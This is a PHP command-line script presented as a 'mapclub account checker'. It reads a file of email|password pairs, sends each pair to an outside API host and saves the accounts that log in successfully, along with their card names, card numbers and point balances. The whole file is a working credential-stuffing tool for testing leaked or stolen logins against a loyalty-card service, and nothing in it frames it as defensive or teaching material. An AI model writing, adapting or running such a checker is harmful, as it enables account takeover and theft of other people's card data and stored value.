<?php
define("OS", strtolower(PHP_OS));
#############################
define("CODENAME", "mapclub");
define("CODENAME_API", "mapclub");
define("API", "http://api-varaveza.c9users.io");

function color() {
    return [
        //--> text
        "LW" => (OS == "linux" ? "\e[1;37m" : ""),
        "WH" => (OS == "linux" ? "\e[0m" : ""),
        "CY" => (OS == "linux" ? "\e[1;36m" : ""),
        "LR" => (OS == "linux" ? "\e[1;31m" : ""),
        "LG" => (OS == "linux" ? "\e[1;32m" : ""),
        "YL" => (OS == "linux" ? "\e[1;33m" : ""),
        //--> background text
        "PL" => (OS == "linux" ? "\e[45m" : "")
    ];
}
function check($email, $pwd) {
    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, API."/".CODENAME_API.".php");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "email=".$email."&password=".$pwd);
    $page = curl_exec($ch);
    curl_close($ch);
    return json_decode($page, true);
}

$files = [];
echo color()["YL"].ucfirst(CODENAME)." account checker".color()["WH"].PHP_EOL;
$files["empass"] = readline("- empass name : ");
$files["live_acc"] = readline("- live account saved at (default: ".CODENAME."-live.txt) : ");
if(!empty($files["empass"]) && file_exists($files["empass"])) {
    echo PHP_EOL;
    $files["empass"] = str_replace("\r", "", file_get_contents($files["empass"]));
    $expl = explode("\n", $files["empass"]);
    $files["live_acc"] = (empty($files["live_acc"]) ? CODENAME."-live.txt" : $files["live_acc"]);
    $no = 1;
    foreach($expl as $empass) {
        if(OS == "linux") echo color()["PL"]."#> checking ".$empass." ..".color()["WH"]."\r";
        list($email, $pwd) = explode("|", $empass);
        $check = check($email, $pwd);
        if($check["login"] == "success") {
            file_put_contents($files["live_acc"], $empass." [".$check["cardname"]." - ".$check["cardnumber"]." - Rp ".$check["point"]."]".PHP_EOL, FILE_APPEND);
            echo "[".$no."/".count($expl)."] ".$empass." [".$check["cardname"]." - ".$check["cardnumber"]." - Rp ".$check["point"]."] => ".color()["LG"]."Live".color()["WH"].PHP_EOL;
        }else {
            echo "[".$no."/".count($expl)."] ".$empass." => ".color()["LR"]."Die".color()["WH"].PHP_EOL;
        }
        $no++;
    }
    echo PHP_EOL.color()["YL"]."[*] live account saved at ".$files["live_acc"].color()["WH"].PHP_EOL;
}else {
    echo color()["LR"]."[-] file not found".color()["WH"].PHP_EOL;
}